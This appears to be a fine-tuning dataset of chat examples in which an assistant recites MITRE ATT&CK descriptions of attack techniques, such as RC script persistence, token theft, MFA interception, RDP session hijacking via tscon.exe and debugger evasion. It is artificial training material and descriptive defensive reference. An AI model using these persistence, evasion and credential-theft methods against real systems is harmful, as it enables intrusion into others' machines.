{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'RC Scripts' and with the Id: T1037.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'RC Scripts' and with the Id: T1037.004 is described as follows: Adversaries may establish persistence by modifying RC scripts which are executed during a Unix-like system\u2019s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.Adversaries can establish persistence by adding a malicious binary path or shell commands to <code>rc.local</code>, <code>rc.common</code>, and other RC scripts specific to the Unix-like distribution.(Citation: IranThreats Kittens Dec 2017)(Citation: Intezer HiddenWasp Map 2019) Upon reboot, the system executes the script's contents as root, resulting in persistence.Adversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as IoT or embedded systems.(Citation: intezer-kaiji-malware)Several Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of [Launchd](https://attack.mitre.org/techniques/T1053/004). (Citation: Apple Developer Doco Archive Launchd)(Citation: Startup Items) This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.(Citation: Methods of Mac Malware Persistence) To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.(Citation: Ubuntu Manpage systemd rc). The systems targeted by this attack pattern are: macOS, Linux, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Access Token Manipulation' and with the Id: T1134 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Access Token Manipulation' and with the Id: T1134 is described as follows: Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)Any standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Time Providers' and with the Id: T1209 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Time Providers' and with the Id: T1209 is described as follows: The Windows Time service (W32Time) enables time synchronization across and within domains. (Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients. (Citation: Microsoft TimeProvider)Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of  <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\</code>. (Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed. (Citation: Microsoft TimeProvider)Adversaries may abuse this architecture to establish Persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account. (Citation: Github W32Time Oct 2017). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Multi-Factor Authentication Interception' and with the Id: T1111 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Multi-Factor Authentication Interception' and with the Id: T1111 is described as follows: Adversaries may target multi-factor authentication (MFA) mechanisms, (i.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. If a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. (Citation: Mandiant M Trends 2011)Adversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). (Citation: GCN RSA June 2011)Other methods of MFA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Service providers can also be targeted: for example, an adversary may compromise an SMS messaging service in order to steal MFA codes sent to users\u2019 phones.(Citation: Okta Scatter Swine 2022). The systems targeted by this attack pattern are: Linux, Windows, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Launch Agent' and with the Id: T1159 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Launch Agent' and with the Id: T1159 is described as follows: Per Apple\u2019s developer documentation, when a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (plist) files found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>$HOME/Library/LaunchAgents</code> (Citation: AppleDocs Launch Agent Daemons) (Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware). These launch agents have property list files which point to the executables that will be launched (Citation: OSX.Dok Malware). Adversaries may install a new launch agent that can be configured to execute at login by using launchd or launchctl to load a plist into the appropriate directories  (Citation: Sofacy Komplex Trojan)  (Citation: Methods of Mac Malware Persistence). The agent name may be disguised by using a name from a related operating system or benign software. Launch Agents are created with user level privileges and are executed with the privileges of the user when they log in (Citation: OSX Malware Detection) (Citation: OceanLotus for OS X). They can be set up to execute when a specific user logs in (in the specific user\u2019s directory structure) or when any user logs in (which requires administrator privileges).. The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Software Packing' and with the Id: T1027.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Software Packing' and with the Id: T1027.002 is described as follows: Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018) Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.(Citation: Awesome Executable Packing)  . The systems targeted by this attack pattern are: macOS, Windows, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Serverless' and with the Id: T1584.007 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Serverless' and with the Id: T1584.007 is described as follows: Adversaries may compromise serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them. Once compromised, the serverless runtime environment can be leveraged to either respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090) traffic to an adversary-owned command and control server.(Citation: BlackWater Malware Cloudflare Workers)(Citation: AWS Lambda Redirector) As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.(Citation: Detecting Command & Control in the Cloud)(Citation: BlackWater Malware Cloudflare Workers). The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Web Protocols' and with the Id: T1071.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Web Protocols' and with the Id: T1071.001 is described as follows: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Protocols such as HTTP/S(Citation: CrowdStrike Putter Panda) and WebSocket(Citation: Brazking-Websockets) that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. . The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Visual Basic' and with the Id: T1059.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Visual Basic' and with the Id: T1059.005 is described as follows: Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)Derivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)Adversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads (which may also involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005) to enable execution).(Citation: Default VBS macros Blocking ). The systems targeted by this attack pattern are: Windows, macOS, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Hidden File System' and with the Id: T1564.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Hidden File System' and with the Id: T1564.005 is described as follows: Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.(Citation: MalwareTech VFS Nov 2014)Adversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.(Citation: MalwareTech VFS Nov 2014)(Citation: FireEye Bootkits) Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system.(Citation: ESET ComRAT May 2020) Adversaries may also fragment files across the existing file system structure in non-standard ways.(Citation: Kaspersky Equation QA). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Systemd Service' and with the Id: T1543.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Systemd Service' and with the Id: T1543.002 is described as follows: Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014) Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.  Systemd utilizes unit configuration files with the `.service` file extension to encode information about a service's process. By default, system level unit files are stored in the `/systemd/system` directory of the root owned directories (`/`). User level unit files are stored in the `/systemd/user` directories of the user owned directories (`$HOME`).(Citation: lambert systemd 2022) Inside the `.service` unit files, the following directives are used to execute commands:(Citation: freedesktop systemd.service)  * `ExecStart`, `ExecStartPre`, and `ExecStartPost` directives execute when a service is started manually by `systemctl` or on system start if the service is set to automatically start.* `ExecReload` directive executes when a service restarts. * `ExecStop`, `ExecStopPre`, and `ExecStopPost` directives execute when a service is stopped.  Adversaries have created new service files, altered the commands a `.service` file\u2019s directive executes, and modified the user directive a `.service` file executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem.(Citation: Anomali Rocke March 2019)(Citation: airwalk backdoor unix systems)(Citation: Rapid7 Service Persistence 22JUNE2016) The .service file\u2019s User directive can be used to run service as a specific user, which could result in privilege escalation based on specific user/group permissions. . The systems targeted by this attack pattern are: Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'RDP Hijacking' and with the Id: T1563.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'RDP Hijacking' and with the Id: T1563.002 is described as follows: Adversaries may hijack a legitimate user\u2019s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services)Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, `c:\\windows\\system32\\tscon.exe [session number to be stolen]`, an adversary can hijack a session without the need for credentials or prompts to the user.(Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions.(Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.(Citation: Kali Redsnarf). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Create Account' and with the Id: T1136 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Create Account' and with the Id: T1136 is described as follows: Adversaries may create an account to maintain access to victim systems.(Citation: Symantec WastedLocker June 2020) With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.Accounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.. The systems targeted by this attack pattern are: Windows, Azure AD, Office 365, IaaS, Linux, macOS, Google Workspace, Network, Containers, SaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'XDG Autostart Entries' and with the Id: T1547.013 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'XDG Autostart Entries' and with the Id: T1547.013 is described as follows: Adversaries may add or modify XDG Autostart Entries to execute malicious programs or commands when a user\u2019s desktop environment is loaded at login. XDG Autostart entries are available for any XDG-compliant Linux system. XDG Autostart entries use Desktop Entry files (`.desktop`) to configure the user\u2019s desktop environment upon user login. These configuration files determine what applications launch upon user login, define associated applications to open specific file types, and define applications used to open removable media.(Citation: Free Desktop Application Autostart Feb 2006)(Citation: Free Desktop Entry Keys)Adversaries may abuse this feature to establish persistence by adding a path to a malicious binary or command to the `Exec` directive in the `.desktop` configuration file. When the user\u2019s desktop environment is loaded at user login, the `.desktop` files located in the XDG Autostart directories are automatically executed. System-wide Autostart entries are located in the `/etc/xdg/autostart` directory while the user entries are located in the `~/.config/autostart` directory.Adversaries may combine this technique with [Masquerading](https://attack.mitre.org/techniques/T1036) to blend malicious Autostart entries with legitimate programs.(Citation: Red Canary Netwire Linux 2022). The systems targeted by this attack pattern are: Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Server' and with the Id: T1584.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Server' and with the Id: T1584.004 is described as follows: Adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control.(Citation: TrendMicro EarthLusca 2022) Instead of purchasing a [Server](https://attack.mitre.org/techniques/T1583/004) or [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may compromise third-party servers in support of operations.Adversaries may also compromise web servers to support watering hole operations, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or email servers to support [Phishing](https://attack.mitre.org/techniques/T1566) operations.. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Cloud Service Discovery' and with the Id: T1526 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Cloud Service Discovery' and with the Id: T1526 is described as follows: An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Azure AD, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.Adversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Azure AD Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.(Citation: Azure - Resource Manager API)(Citation: Azure AD Graph API)For example, Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.(Citation: Azure - Stormspotter)(Citation: GitHub Pacu)Adversaries may use the information gained to shape follow-on behaviors, such as targeting data or credentials from enumerated services or evading identified defenses through [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001) or [Disable or Modify Cloud Logs](https://attack.mitre.org/techniques/T1562/008).. The systems targeted by this attack pattern are: Azure AD, Office 365, SaaS, IaaS, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Space after Filename' and with the Id: T1151 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Space after Filename' and with the Id: T1151 is described as follows: Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system. For example, if there is a Mach-O executable file called evil.bin, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to evil.txt, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to \"evil.txt \" (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed (Citation: Mac Backdoors are back). Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.. The systems targeted by this attack pattern are: Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Remote System Discovery' and with the Id: T1018 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Remote System Discovery' and with the Id: T1018 is described as follows: Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097) or <code>net view</code> using [Net](https://attack.mitre.org/software/S0039).Adversaries may also analyze data from local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099) cache entries) in order to discover the presence of remote systems in an environment.Adversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).(Citation: US-CERT-TA18-106A)(Citation: CISA AR21-126A FIVEHANDS May 2021)  . The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Network Service Discovery' and with the Id: T1046 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Network Service Discovery' and with the Id: T1046 is described as follows: Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.(Citation: CISA AR21-126A FIVEHANDS May 2021)   Within cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.Within macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host\u2019s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service.(Citation: apple doco bonjour description)(Citation: macOS APT Activity Bradley). The systems targeted by this attack pattern are: Windows, IaaS, Linux, macOS, Containers, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Domain Properties' and with the Id: T1590.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Domain Properties' and with the Id: T1590.001 is described as follows: Adversaries may gather information about the victim's network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers.Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex: [WHOIS](https://attack.mitre.org/techniques/T1596/002)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Where third-party cloud providers are in use, this information may also be exposed through publicly available API endpoints, such as GetUserRealm and autodiscover in Office 365 environments.(Citation: Azure Active Directory Reconnaisance)(Citation: Office 265 Azure Domain Availability) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Software Discovery' and with the Id: T1518 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Software Discovery' and with the Id: T1518 is described as follows: Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from [Software Discovery](https://attack.mitre.org/techniques/T1518) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Such software may be deployed widely across the environment for configuration management or security reasons, such as [Software Deployment Tools](https://attack.mitre.org/techniques/T1072), and may allow adversaries broad access to infect devices or move laterally.Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).. The systems targeted by this attack pattern are: Windows, IaaS, Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Cloud Service Dashboard' and with the Id: T1538 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Cloud Service Dashboard' and with the Id: T1538 is described as follows: An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.(Citation: Google Command Center Dashboard)Depending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.. The systems targeted by this attack pattern are: Azure AD, Office 365, IaaS, Google Workspace, SaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Thread Local Storage' and with the Id: T1055.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Thread Local Storage' and with the Id: T1055.005 is described as follows: Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. TLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process\u2019 memory space using other [Process Injection](https://attack.mitre.org/techniques/T1055) techniques such as [Process Hollowing](https://attack.mitre.org/techniques/T1055/012).(Citation: FireEye TLS Nov 2017)Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process. . The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Debugger Evasion' and with the Id: T1622 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Debugger Evasion' and with the Id: T1622 is described as follows: Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.(Citation: ProcessHacker Github)Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497), if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.Specific checks will vary based on the target and/or adversary, but may involve [Native API](https://attack.mitre.org/techniques/T1106) function calls such as <code>IsDebuggerPresent()</code> and <code> NtQueryInformationProcess()</code>, or manually checking the <code>BeingDebugged</code> flag of the Process Environment Block (PEB). Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would \u201cswallow\u201d or handle the potential error).(Citation: hasherezade debug)(Citation: AlKhaser Debug)(Citation: vxunderground debug)Adversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping [Native API](https://attack.mitre.org/techniques/T1106) function calls such as <code>OutputDebugStringW()</code>.(Citation: wardle evilquest partii)(Citation: Checkpoint Dridex Jan 2021). The systems targeted by this attack pattern are: Windows, Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Space after Filename' and with the Id: T1036.006 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Space after Filename' and with the Id: T1036.006 is described as follows: Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.For example, if there is a Mach-O executable file called <code>evil.bin</code>, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to <code>evil.txt</code>, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to <code>evil.txt </code> (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed (Citation: Mac Backdoors are back).Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.. The systems targeted by this attack pattern are: Linux, macOS ."}]}
